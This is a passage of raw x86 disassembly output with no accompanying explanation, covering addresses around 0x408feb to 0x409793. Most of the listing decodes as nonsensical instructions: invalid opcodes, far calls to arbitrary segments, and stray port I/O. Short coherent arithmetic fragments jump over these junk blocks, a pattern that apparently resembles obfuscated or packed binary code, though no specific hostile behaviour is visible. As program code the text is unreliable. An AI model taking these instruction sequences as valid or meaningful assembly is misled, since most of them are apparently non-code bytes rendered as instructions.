  408feb:	cmp    BYTE PTR [ebp-0x5cce9c1f],cl
  408ff1:	mov    dh,0x8a
  408ff3:	jns    0x408f8f
  408ff5:	pop    edx
  408ff6:	jns    0x409013
  408ff8:	pushf  
  408ff9:	shr    DWORD PTR [edx],1
  408ffb:	push   ss
  408ffc:	sbb    eax,0xf764529e
  409001:	or     eax,0xba90631b
  409006:	es mov ebx,0x78db0603
  40900c:	fistp  QWORD PTR [ebx]
  40900e:	mov    BYTE PTR [ebx+ebx*2-0x4c],0x38
  409013:	sti    
  409014:	fsincos 
  409016:	mov    ah,0xfc
  409018:	stos   BYTE PTR es:[edi],al
  409019:	loopne 0x409050
  40901b:	push   eax
  40901c:	sub    eax,0x9f6e173c
  409021:	ja     0x409079
  409023:	call   0x38b8:0x5207e643
  40902a:	(bad)  
  40902b:	(bad)  
  40902c:	mov    edx,0xe960f127
  409031:	fcomp  DWORD PTR [esi]
  409033:	xchg   esi,eax
  409034:	scas   eax,DWORD PTR es:[edi]
  409035:	(bad)  
  409036:	(bad)  
  409038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409039:	mov    bl,BYTE PTR [edi+0x2f]
  40903c:	leave  
  40903d:	lds    ebx,FWORD PTR [edi+0x4eacd995]
  409043:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409045:	sahf   
  409046:	fwait
  409047:	xchg   edx,eax
  409048:	scas   eax,DWORD PTR es:[edi]
  409049:	call   0x54ae:0xc51ffa00
  409050:	out    0x40,al
  409052:	xchg   DWORD PTR [ecx-0x70f7dd94],ebp
  409058:	outs   dx,BYTE PTR ds:[esi]
  409059:	adc    edi,ebx
  40905b:	fstp   QWORD PTR [ebx]
  40905d:	jmp    0x1674:0x45543695
  409064:	push   0x4a
  409066:	popf   
  409067:	stc    
  409068:	dec    ecx
  409069:	cmp    edx,DWORD PTR [ecx+0x3f]
  40906c:	ds mov ecx,0x8b336f41
  409072:	dec    edi
  409073:	cdq    
  409074:	in     al,dx
  409075:	fcomp  DWORD PTR [ecx]
  409077:	mov    al,ds:0xfc7f9674
  40907c:	(bad)  
  40907d:	ficom  WORD PTR [edx+0x72]
  409080:	and    BYTE PTR [ebx-0x69],dh
  409083:	fs ror edi,1
  409086:	aad    0xcf
  409088:	lods   eax,DWORD PTR ds:[esi]
  409089:	pop    eax
  40908a:	pop    ebx
  40908b:	popf   
  40908c:	call   0x8940:0x51b49311
  409093:	xchg   edi,eax
  409094:	adc    al,dh
  409096:	cmove  ecx,DWORD PTR [edx-0x1e59fe8c]
  40909d:	lods   al,BYTE PTR ds:[esi]
  40909e:	cmp    ah,BYTE PTR [esi]
  4090a0:	fiadd  DWORD PTR [eax+0x1f60c8b0]
  4090a6:	sahf   
  4090a7:	out    dx,al
  4090a8:	fistp  WORD PTR [edx-0x2d]
  4090ab:	sahf   
  4090ac:	cmp    al,0xf4
  4090ae:	loope  0x409091
  4090b0:	cdq    
  4090b1:	dec    edi
  4090b2:	push   ebp
  4090b3:	mov    BYTE PTR [ebx-0x7],cl
  4090b6:	ds nop
  4090b8:	jmp    0x40903f
  4090ba:	imul   eax,edx,0x4c411bc0
  4090c0:	xchg   DWORD PTR [ebx],ebx
  4090c2:	out    dx,eax
  4090c3:	mov    dl,BYTE PTR [ebx]
  4090c5:	sub    ebp,DWORD PTR [esi+0x33]
  4090c8:	ins    BYTE PTR es:[edi],dx
  4090c9:	xchg   ecx,eax
  4090ca:	dec    edx
  4090cb:	mov    ah,0xd1
  4090cd:	cmp    dh,bh
  4090cf:	ret    
  4090d0:	pop    edx
  4090d1:	cmp    esi,eax
  4090d3:	mov    DWORD PTR ds:0x42a801,0x7b75
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0x66a4c6c4
  4090f5:	adc    al,0x39
  4090f7:	in     eax,0x8e
  4090f9:	out    dx,eax
  4090fa:	js     0x409174
  4090fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090fd:	jle    0x409177
  4090ff:	js     0x4090a6
  409101:	inc    edi
  409102:	jg     0x4090be
  409104:	or     al,0x4c
  409106:	repnz stc 
  409108:	(bad)  
  40910a:	pusha  
  40910b:	pop    ebx
  40910c:	and    bl,cl
  40910e:	mov    esi,0x729cd8b4
  409113:	ins    BYTE PTR es:[edi],dx
  409114:	or     ebp,DWORD PTR [esi+0x64]
  409117:	test   DWORD PTR [esi-0xd],ecx
  40911a:	mov    al,0x9b
  40911c:	mov    DWORD PTR [edi],ecx
  40911e:	mov    ds:0xb4914b1b,eax
  409123:	sub    ah,ah
  409125:	jge    0x40911f
  409127:	jecxz  0x40912b
  409129:	nop
  40912a:	jb     0x409183
  40912c:	push   eax
  40912d:	fiadd  DWORD PTR [esi]
  40912f:	jecxz  0x4090ba
  409131:	js     0x4090b3
  409133:	jb     0x409104
  409135:	jae    0x4090d7
  409137:	arpl   WORD PTR [edi+esi*8],di
  40913a:	fiadd  DWORD PTR [ebx]
  40913c:	sub    eax,0x70ee6539
  409141:	lea    eax,[eax+0x54]
  409144:	pusha  
  409145:	enter  0x8eb1,0xdb
  409149:	ret    
  40914a:	(bad)  
  40914c:	adc    dl,BYTE PTR [edx]
  40914e:	and    esi,edi
  409150:	cmp    esi,edx
  409152:	dec    esp
  409153:	jo     0x409170
  409155:	sbb    al,0xa7
  409157:	int    0x5c
  409159:	xor    al,0x14
  40915b:	(bad)
  40915e:	stc    
  40915f:	dec    ebx
  409160:	cmp    edx,DWORD PTR [esi+edi*4]
  409163:	jl     0x409164
  409165:	dec    ebp
  409166:	xor    ch,BYTE PTR [edx]
  409168:	jns    0x40916f
  40916a:	cmp    bl,BYTE PTR [esi]
  40916c:	xchg   ecx,eax
  40916d:	xor    al,0x3
  40916f:	dec    edx
  409170:	fstp   DWORD PTR [eax+0x65bf9ee3]
  409176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409177:	push   cs
  409178:	pop    ecx
  409179:	or     eax,0x10de7197
  40917e:	jp     0x409154
  409180:	xchg   esp,eax
  409181:	cmp    al,0x39
  409183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409184:	mov    cl,cl
  409186:	stc    
  409187:	sbb    DWORD PTR ds:0x9e6ac68a,ebp
  40918d:	popa   
  40918e:	mov    dh,0x40
  409190:	call   0x6c289e71
  409195:	out    dx,al
  409196:	js     0x40914a
  409198:	inc    edx
  409199:	mov    BYTE PTR [ebp+eax*1-0x2b],dh
  40919d:	sub    eax,0x73f03413
  4091a2:	std    
  4091a3:	sub    al,0xa0
  4091a5:	bound  esi,QWORD PTR [ebx+esi*1]
  4091a8:	call   0x5bcb:0x92b276d3
  4091af:	adc    cl,BYTE PTR ds:0x83a7b29b
  4091b5:	jae    0x409226
  4091b7:	push   esp
  4091b8:	(bad)  
  4091ba:	cmp    eax,0xfe319326
  4091bf:	or     bh,bl
  4091c1:	xor    edi,DWORD PTR [eax]
  4091c3:	lds    eax,FWORD PTR [esi]
  4091c5:	rcr    BYTE PTR [esi],cl
  4091c7:	add    eax,DWORD PTR [esi+eax*1]
  4091ca:	inc    esi
  4091cb:	pusha  
  4091cc:	bound  ecx,QWORD PTR [eax+0x51]
  4091cf:	mov    cl,0x2
  4091d1:	mov    ebp,0x8706c793
  4091d6:	pusha  
  4091d7:	lea    ebx,[ebx+eiz*1+0x58373184]
  4091de:	mov    ah,0x9d
  4091e0:	int3   
  4091e1:	stos   BYTE PTR es:[edi],al
  4091e2:	loope  0x40918a
  4091e4:	xlat   BYTE PTR ds:[ebx]
  4091e5:	cmp    eax,0xa56f62ff
  4091ea:	(bad)  
  4091eb:	add    eax,0xdfbb0a
  4091f0:	cs es mov ebp,0xbfecf565
  4091f7:	(bad)  
  4091f8:	ror    DWORD PTR [eax-0x69],1
  4091fb:	mov    al,0x8d
  4091fd:	in     eax,dx
  4091fe:	es mov bh,0x0
  409201:	jnp    0x409214
  409203:	xor    ecx,ebx
  409205:	dec    esi
  409206:	jne    0x4091db
  409208:	aad    0x2e
  40920a:	jge    0x4091a8
  40920c:	mov    ds:0x31518906,al
  409211:	pop    ecx
  409212:	pop    edx
  409213:	outs   dx,BYTE PTR ds:[esi]
  409214:	sti    
  409215:	lock mov eax,0x460f79b8
  40921b:	cld    
  40921c:	or     ebp,DWORD PTR [edi+0x46]
  40921f:	out    dx,eax
  409220:	mov    edx,0x1cd614f4
  409225:	pop    ebp
  409226:	stos   BYTE PTR es:[edi],al
  409227:	add    al,0x36
  409229:	lds    edi,FWORD PTR [esi+0xe160655]
  40922f:	icebp  
  409230:	cmp    ebp,0xf178b197
  409236:	rcr    BYTE PTR [ebx-0x8ecc7db],0x8
  40923d:	sub    eax,0xdccf2b2
  409242:	lods   eax,DWORD PTR ds:[esi]
  409243:	fbld   TBYTE PTR [eax]
  409245:	(bad)  
  409246:	mov    ecx,0xd9aa6bc5
  40924b:	iret   
  40924c:	and    cl,bh
  40924e:	pop    es
  40924f:	mov    cl,0x7d
  409251:	call   0xa6fb:0xfe29a14b
  409258:	adc    al,0x46
  40925a:	jbe    0x409258
  40925c:	stos   BYTE PTR es:[edi],al
  40925d:	push   ecx
  40925e:	int3   
  40925f:	adc    ebx,DWORD PTR [ebx]
  409261:	out    dx,eax
  409262:	xchg   esp,eax
  409263:	push   eax
  409264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409265:	jns    0x409204
  409267:	pop    ecx
  409268:	jp     0x409281
  40926a:	repz and al,0xb
  40926d:	sbb    ebx,edi
  40926f:	(bad)  
  409271:	pop    eax
  409272:	dec    edi
  409273:	push   ds
  409274:	inc    edi
  409275:	jp     0x409227
  409277:	bound  edx,QWORD PTR [edx-0x4f]
  40927a:	(bad)
  40927d:	adc    eax,0x93ef487
  409282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409283:	mov    edi,ecx
  409285:	and    ah,dl
  409287:	into   
  409288:	std    
  409289:	and    ah,BYTE PTR [edi-0x2baf0a12]
  40928f:	push   es
  409290:	mov    edx,0xd34475a1
  409295:	jg     0x40929c
  409297:	or     eax,0xd75364b9
  40929c:	mov    eax,ds:0x9704bc04
  4092a1:	outs   dx,DWORD PTR ds:[esi]
  4092a2:	cmp    eax,0xf74cd942
  4092a7:	mov    cl,0xa1
  4092a9:	(bad)  
  4092aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092ab:	in     eax,0x1b
  4092ad:	icebp  
  4092ae:	push   ecx
  4092af:	js     0x409301
  4092b1:	pop    edx
  4092b2:	and    al,0xde
  4092b4:	ds mov bl,0xd6
  4092b7:	outs   dx,BYTE PTR ds:[esi]
  4092b8:	mov    ah,0x19
  4092ba:	dec    eax
  4092bb:	shr    BYTE PTR [ebx+0x57c9920a],1
  4092c1:	dec    edx
  4092c2:	test   BYTE PTR [edi-0x4af7a8ec],bl
  4092c8:	out    dx,eax
  4092c9:	jge    0x4092d9
  4092cb:	popa   
  4092cc:	jns    0x4092f9
  4092ce:	les    ecx,FWORD PTR [edi+0xbe621b1]
  4092d4:	pop    edx
  4092d5:	or     eax,0xbcc2db8e
  4092da:	push   edx
  4092db:	push   eax
  4092dc:	jl     0x4092f0
  4092de:	repnz or eax,0x3ae47f98
  4092e4:	push   edi
  4092e5:	pop    esp
  4092e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092e7:	mov    bl,0xd5
  4092e9:	mov    ah,0x6d
  4092eb:	cld    
  4092ec:	jno    0x4092ef
  4092ee:	mov    bl,0x35
  4092f0:	pop    ds
  4092f1:	sti    
  4092f2:	dec    eax
  4092f3:	jno    0x40928b
  4092f5:	pop    es
  4092f6:	inc    esp
  4092f7:	add    ah,ch
  4092f9:	int    0xa5
  4092fb:	or     eax,0xcf26f008
  409300:	jbe    0x40930e
  409302:	imul   ecx,DWORD PTR [ecx-0x4eb8f5f0],0xe06764da
  40930c:	mov    edi,edx
  40930e:	jp     0x409296
  409310:	xlat   BYTE PTR ds:[ebx]
  409311:	shr    BYTE PTR [ecx-0x1d886966],1
  409317:	shl    DWORD PTR [eax],1
  409319:	mov    ebx,0xe51f88e4
  40931e:	fldenv [ebx+0x30]
  409321:	add    al,0x30
  409323:	test   eax,0x44362e59
  409328:	mov    ecx,0x5cc8a9bd
  40932d:	mov    dh,0xdf
  40932f:	and    eax,0xf80d15a6
  409334:	cmp    al,0x29
  409336:	in     al,dx
  409337:	call   0x4bcb4cd2
  40933c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40933d:	js     0x409383
  40933f:	lds    edi,FWORD PTR [edx]
  409341:	ins    BYTE PTR es:[edi],dx
  409342:	call   0xb93d:0xab563ed5
  409349:	pushf  
  40934a:	xlat   BYTE PTR ds:[ebx]
  40934b:	xchg   BYTE PTR [ebp+0x79bc307],bl
  409351:	test   eax,0xb2b785a5
  409356:	adc    edi,0x5e
  409359:	sti    
  40935a:	out    dx,eax
  40935b:	sub    al,0x6c
  40935d:	arpl   WORD PTR [ebp-0x1f1f55e2],si
  409363:	loop   0x409388
  409365:	(bad)  
  409366:	sti    
  409367:	sub    ebx,DWORD PTR [ebp+edi*1-0x43]
  40936b:	dec    DWORD PTR [eax]
  40936d:	cmp    BYTE PTR [edx],bl
  40936f:	arpl   WORD PTR [eax],bp
  409371:	lock jbe 0x4093b2
  409374:	in     eax,0x87
  409376:	outs   dx,DWORD PTR ds:[esi]
  409377:	pop    edx
  409378:	mov    ds:0xa9eeb061,eax
  40937d:	inc    esi
  40937e:	xchg   ecx,eax
  40937f:	ss leave 
  409381:	rol    DWORD PTR [ebp-0x12ef20d1],1
  409387:	add    esi,esp
  409389:	scas   eax,DWORD PTR es:[edi]
  40938a:	jb     0x409354
  40938c:	push   0xbfe2f696
  409391:	sahf   
  409392:	setnp  bl
  409395:	addr16 xor eax,0x61121fc3
  40939b:	or     eax,0xc433eca5
  4093a0:	aad    0xb8
  4093a2:	mov    dl,0xf0
  4093a4:	sbb    eax,0xae355453
  4093a9:	mov    eax,DWORD PTR [ebp-0x4]
  4093ac:	add    DWORD PTR ds:0x42a7b9,0x42a769
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0x932eff3d
  4093fb:	sbb    eax,0x78ec35ed
  409400:	js     0x4093a9
  409402:	jle    0x40947c
  409404:	js     0x409401
  409406:	outs   dx,DWORD PTR ds:[esi]
  409407:	call   0x1d2ae1f7
  40940c:	popa   
  40940d:	gs das 
  40940f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409410:	pop    ebx
  409411:	repnz clc 
  409413:	cmc    
  409414:	cli    
  409415:	cmp    edx,DWORD PTR [eax-0x537fca17]
  40941b:	mov    dl,0xf
  40941d:	xchg   BYTE PTR [ecx],dl
  40941f:	mov    bl,0x91
  409421:	sub    al,0xd8
  409423:	or     eax,0x4b886d70
  409428:	bound  esi,QWORD PTR [ebx+edx*4+0x6f]
  40942c:	pop    ss
  40942d:	sbb    DWORD PTR [ebp+0x4080318c],ecx
  409433:	arpl   WORD PTR [edx+ebx*2-0x25],dx
  409437:	mov    al,ds:0xbb950b6f
  40943c:	and    al,0x77
  40943e:	cld    
  40943f:	cli    
  409440:	nop
  409441:	call   DWORD PTR ds:0xabc463e7
  409447:	adc    DWORD PTR [ebp-0x6a],edx
  40944a:	fidivr WORD PTR [esi]
  40944c:	add    DWORD PTR [esi],ebp
  40944e:	dec    ebx
  40944f:	les    ecx,FWORD PTR [esi-0x22]
  409452:	xchg   BYTE PTR [edx],ch
  409454:	test   DWORD PTR [esp+ebx*1-0x23],ebx
  409458:	inc    edx
  409459:	stc    
  40945a:	outs   dx,DWORD PTR ds:[esi]
  40945b:	arpl   WORD PTR [edx-0x72],ax
  40945e:	adc    esi,DWORD PTR [esi+0x48ca4863]
  409464:	scas   al,BYTE PTR es:[edi]
  409465:	mov    esp,0x804787c7
  40946a:	adc    al,0x89
  40946c:	ins    DWORD PTR es:[edi],dx
  40946d:	mov    dh,0x57
  40946f:	dec    edx
  409470:	jne    0x4094a9
  409472:	inc    edx
  409473:	mov    WORD PTR [ebp-0x35d8ea60],ds
  409479:	pop    ebp
  40947a:	ret    
  40947b:	sub    dl,BYTE PTR [edi+ecx*2]
  40947e:	push   ebp
  40947f:	aam    0x59
  409481:	jmp    0x40946b
  409483:	cmp    BYTE PTR [eax+0x6b],cl
  409486:	(bad)  
  409487:	test   al,0x25
  409489:	push   edx
  40948a:	push   ds
  40948b:	retf   
  40948c:	pop    edi
  40948d:	je     0x409483
  40948f:	and    al,0x3d
  409491:	shl    edx,1
  409493:	int3   
  409494:	iret   
  409495:	or     ecx,edi
  409497:	iret   
  409498:	push   ds
  409499:	xor    DWORD PTR [eax+0x75cd3b6],eax
  40949f:	(bad)  
  4094a0:	gs ja  0x409470
  4094a3:	pop    ebx
  4094a4:	loope  0x409426
  4094a6:	dec    edi
  4094a7:	add    BYTE PTR [ebx+0xb],dl
  4094aa:	jne    0x4094ce
  4094ac:	lods   al,BYTE PTR ds:[esi]
  4094ad:	cwde   
  4094ae:	in     eax,dx
  4094af:	push   ecx
  4094b0:	adc    ecx,DWORD PTR [eax+0x13]
  4094b3:	repnz mov ch,0xd2
  4094b6:	adc    BYTE PTR ds:[eax+0x20],ch
  4094ba:	in     al,0xef
  4094bc:	jbe    0x4094b6
  4094be:	mov    WORD PTR [ebp+0x3f],fs
  4094c1:	aaa    
  4094c2:	ret    0x25c2
  4094c5:	cli    
  4094c6:	mov    edx,0xa375b3fa
  4094cb:	cmp    DWORD PTR [edx],esp
  4094cd:	into   
  4094ce:	jmp    0x3438b6b1
  4094d3:	fsub   DWORD PTR [ebx+0x1f]
  4094d6:	(bad)  
  4094d7:	jmp    FWORD PTR [ebx+esi*8]
  4094da:	cmp    al,0x7e
  4094dc:	push   edx
  4094dd:	mov    dh,0x7c
  4094df:	and    cl,BYTE PTR [esi+0x17]
  4094e2:	rol    DWORD PTR [edx],1
  4094e4:	enter  0xeb1e,0x56
  4094e8:	adc    DWORD PTR [edi+edx*8],ebp
  4094eb:	xchg   edx,eax
  4094ec:	cmc    
  4094ed:	dec    ecx
  4094ee:	dec    edx
  4094ef:	mov    dl,0x48
  4094f1:	sbb    al,0xa
  4094f3:	jle    0x409530
  4094f5:	arpl   WORD PTR [eax+0x7],ax
  4094f8:	dec    esp
  4094f9:	clc    
  4094fa:	sar    al,0xb4
  4094fd:	in     al,dx
  4094fe:	add    al,0x2e
  409500:	lock out 0x3,al
  409503:	(bad)  
  409504:	leave  
  409505:	mov    bh,0x76
  409507:	dec    esi
  409508:	add    bh,dh
  40950a:	pop    edx
  40950b:	lods   eax,DWORD PTR ds:[esi]
  40950c:	push   edx
  40950d:	fcmovbe st,st(5)
  40950f:	lods   eax,DWORD PTR ds:[esi]
  409510:	cwde   
  409511:	xchg   esi,eax
  409512:	das    
  409513:	lods   al,BYTE PTR ds:[esi]
  409514:	xchg   DWORD PTR [eax+eiz*4+0x4d],eax
  409518:	loope  0x4094a0
  40951a:	nop
  40951b:	dec    ecx
  40951c:	rcl    cl,cl
  40951e:	pop    ebx
  40951f:	sub    cl,ch
  409521:	sub    eax,0x9d0ca271
  409526:	out    dx,al
  409527:	leave  
  409528:	cmp    al,0x7
  40952a:	iret   
  40952b:	jg     0x409538
  40952d:	jbe    0x4095ae
  40952f:	or     DWORD PTR [esi-0x6f],ebp
  409532:	pop    ebp
  409533:	push   ebx
  409534:	jecxz  0x4094d9
  409536:	inc    edi
  409537:	add    eax,0x8e278961
  40953c:	(bad)  
  40953d:	outs   dx,DWORD PTR ds:[esi]
  40953e:	mov    ebp,DWORD PTR [ebx-0x2e]
  409541:	arpl   WORD PTR [edi-0x73],ax
  409544:	cld    
  409545:	test   al,0x86
  409547:	sar    DWORD PTR [ebx],1
  409549:	stc    
  40954a:	cld    
  40954b:	repnz popf 
  40954d:	push   edi
  40954e:	mov    ch,0xc8
  409550:	in     eax,dx
  409551:	bound  edi,QWORD PTR [eax]
  409553:	lds    esp,FWORD PTR [eax]
  409555:	ds pop ds
  409557:	out    dx,al
  409558:	pop    ecx
  409559:	div    ebx
  40955b:	pop    eax
  40955c:	loopne 0x409537
  40955e:	iret   
  40955f:	dec    BYTE PTR [ebp+edx*4-0x64]
  409563:	data16 into 
  409565:	push   ecx
  409566:	ret    
  409567:	mov    WORD PTR [ecx],?
  409569:	or     al,0x18
  40956b:	adc    DWORD PTR [esi-0x4d],0xffffffbb
  40956f:	sub    DWORD PTR [ebp-0x7e],ebp
  409572:	and    DWORD PTR [esi-0x64],eax
  409575:	or     al,0x48
  409577:	out    0x9d,eax
  409579:	ret    
  40957a:	or     ecx,DWORD PTR [eax]
  40957c:	dec    ebx
  40957d:	pop    ds
  40957e:	xchg   edx,eax
  40957f:	rol    BYTE PTR [edx+eax*4-0x3f343c59],1
  409586:	mov    cl,0xc
  409588:	dec    esp
  409589:	mov    al,ds:0xffd88e24
  40958e:	pop    eax
  40958f:	lds    eax,FWORD PTR [edx+eax*8-0x69]
  409593:	dec    eax
  409594:	fisubr WORD PTR [edx]
  409596:	cmp    edx,eax
  409598:	jbe    0x40955b
  40959a:	inc    ecx
  40959b:	(bad)  
  40959c:	idiv   dl
  40959e:	mov    ecx,0xf923bf75
  4095a3:	jg     0x40959d
  4095a5:	push   0xa8dcb3d9
  4095aa:	ffree  st(5)
  4095ac:	int    0x1b
  4095ae:	outs   dx,BYTE PTR ds:[esi]
  4095af:	pushf  
  4095b0:	stc    
  4095b1:	clc    
  4095b2:	fldenv [ebx-0x5c]
  4095b5:	push   0xffffffb4
  4095b7:	scas   eax,DWORD PTR es:[edi]
  4095b8:	push   edx
  4095b9:	adc    bl,bh
  4095bb:	arpl   sp,bx
  4095bd:	or     al,0xad
  4095bf:	rsqrtps xmm3,XMMWORD PTR [ebp+0x7]
  4095c3:	mov    dh,0x8c
  4095c5:	(bad)  
  4095c6:	gs cmc 
  4095c8:	or     ebp,edx
  4095ca:	loope  0x40957d
  4095cc:	sbb    eax,0x5da61b5
  4095d1:	inc    edx
  4095d2:	mov    dl,0x15
  4095d4:	push   esp
  4095d5:	shl    DWORD PTR [edi+0x2ef45cf3],1
  4095db:	jae    0x4095ea
  4095dd:	rcl    DWORD PTR [esi+edx*4-0x51bf2318],cl
  4095e4:	mov    dl,0x82
  4095e6:	dec    ecx
  4095e7:	cmc    
  4095e8:	jmp    0xdcc17eae
  4095ed:	pop    ecx
  4095ee:	daa    
  4095ef:	retf   0x6f3d
  4095f2:	xchg   ecx,eax
  4095f3:	adc    dl,BYTE PTR gs:[edx]
  4095f6:	iret   
  4095f7:	cmp    al,0x66
  4095f9:	and    eax,0x8a5bab10
  4095fe:	xchg   esp,eax
  4095ff:	jge    0x409616
  409601:	pop    edi
  409602:	add    dl,BYTE PTR [edx]
  409604:	enter  0xd79e,0x25
  409608:	xor    DWORD PTR [eax],0xffffffa5
  40960b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40960c:	in     al,0xbb
  40960e:	xchg   dl,cl
  409610:	out    dx,al
  409611:	xor    bh,cl
  409613:	shl    DWORD PTR ds:[edx+0x63],1
  409617:	je     0x409696
  409619:	call   0xb4a9:0x54890720
  409620:	sub    BYTE PTR [ecx+0x43b73542],0xc1
  409627:	hlt    
  409628:	cli    
  409629:	adc    esi,DWORD PTR [ebx+eiz*8]
  40962c:	pusha  
  40962d:	cmp    DWORD PTR [ecx+0x79568e6],edi
  409633:	sar    BYTE PTR [ecx+ebx*4-0x19],1
  409637:	(bad)  
  409638:	or     DWORD PTR [eax+edi*2],esp
  40963b:	sub    ebx,DWORD PTR [ecx-0x2c]
  40963e:	xor    ecx,DWORD PTR [ebp-0x13]
  409641:	(bad)  
  409642:	or     DWORD PTR [edi+ebp*4+0x39a911a5],esp
  409649:	mov    cl,0x59
  40964b:	inc    edx
  40964c:	loope  0x409694
  40964e:	dec    ebp
  40964f:	ins    DWORD PTR es:[edi],dx
  409650:	pop    ecx
  409651:	mov    edx,0x2fe652f0
  409656:	or     ch,dl
  409658:	cmovns edx,DWORD PTR [ebx+0x24]
  40965c:	daa    
  40965d:	jns    0x4096d1
  40965f:	jae    0x409651
  409661:	push   edx
  409662:	jg     0x409690
  409664:	fdivr  QWORD PTR [ebp+0x40496bf3]
  40966a:	nop
  40966b:	or     eax,0xb9cfefa4
  409670:	stos   DWORD PTR es:[edi],eax
  409671:	cli    
  409672:	jnp    0x4096b6
  409674:	mov    ebx,0xba6d2d5e
  409679:	mov    esp,0xb0fcefe3
  40967e:	aas    
  40967f:	inc    edx
  409680:	daa    
  409681:	cwde   
  409682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409683:	dec    esp
  409684:	cs cwde 
  409686:	in     eax,0x95
  409688:	mov    eax,0xc994ab15
  40968d:	jne    0x40963f
  40968f:	xchg   edi,eax
  409690:	and    al,BYTE PTR [esp+eax*1-0x7d3f2b16]
  409697:	mov    eax,0x1331f94e
  40969c:	pop    ss
  40969d:	xchg   edx,eax
  40969e:	jge    0x40966d
  4096a0:	xor    ebp,ebx
  4096a2:	imul   ecx,ebp,0x15f1f579
  4096a8:	jae    0x409708
  4096aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096ab:	in     al,dx
  4096ac:	shl    dh,1
  4096ae:	mov    eax,DWORD PTR [ebp-0x4]
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0xc9
  4096e4:	enter  0x5906,0x5c
  4096e8:	bnd js 0x409763
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x409742
  4096f0:	out    0xd3,al
  4096f2:	scas   al,BYTE PTR es:[edi]
  4096f3:	push   es
  4096f4:	mov    esi,0xd0ca62c6
  4096f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096fa:	aam    0x6a
  4096fc:	jne    0x409753
  4096fe:	add    BYTE PTR [ebx-0x2d],0xcb
  409702:	jb     0x40973e
  409704:	scas   al,BYTE PTR es:[edi]
  409705:	stos   DWORD PTR es:[edi],eax
  409706:	lock popa 
  409708:	sti    
  409709:	fisub  DWORD PTR [eax+eax*2+0x18028fe]
  409710:	jl     0x4096e0
  409712:	or     dh,ch
  409714:	cmp    esp,DWORD PTR [ebx+0x5c8ebdb]
  40971a:	pushf  
  40971b:	cwde   
  40971c:	sar    BYTE PTR [ebp+0x38ec9f6b],0x98
  409723:	sbb    bh,BYTE PTR [ebx+0x59]
  409726:	jl     0x409749
  409728:	or     cl,BYTE PTR [esi+eiz*2-0x62]
  40972c:	xor    DWORD PTR [eax+0x30a08f7e],esp
  409732:	test   edi,0x6b152637
  409738:	push   eax
  409739:	je     0x4096ec
  40973b:	fst    QWORD PTR ds:0x886e1107
  409741:	mov    al,0x73
  409743:	pop    edi
  409744:	mov    eax,0xbff38734
  409749:	(bad)  
  40974a:	imul   DWORD PTR [ecx]
  40974c:	jnp    0x409796
  40974e:	sbb    al,0xb1
  409750:	in     eax,0x93
  409752:	aam    0xec
  409754:	popa   
  409755:	lods   al,BYTE PTR ds:[esi]
  409756:	xchg   edi,eax
  409757:	loop   0x40974c
  409759:	shl    DWORD PTR [eax-0x65],0xb8
  40975d:	repz mov bh,0x75
  409760:	xor    BYTE PTR [eax+0x64c785b6],cl
  409766:	(bad)  
  409767:	iret   
  409768:	(bad)
  40976c:	inc    esp
  40976d:	jno    0x409720
  40976f:	fdiv   st,st(6)
  409771:	ror    ebp,cl
  409773:	jl     0x409735
  409775:	stos   BYTE PTR es:[edi],al
  409776:	xchg   BYTE PTR [edi],ch
  409778:	mov    esp,0x4c8db7fe
  40977d:	xchg   edi,eax
  40977e:	neg    DWORD PTR [esi-0x61d67f13]
  409784:	pop    es
  409785:	cdq    
  409786:	jo     0x4097c1
  409788:	sub    al,0x2d
  40978a:	sbb    dh,bl
  40978c:	sub    BYTE PTR [esi+0x11],cl
  40978f:	in     al,dx
  409790:	inc    ebp
  409791:	jp     0x40977b
  409793:	jge    0x409766
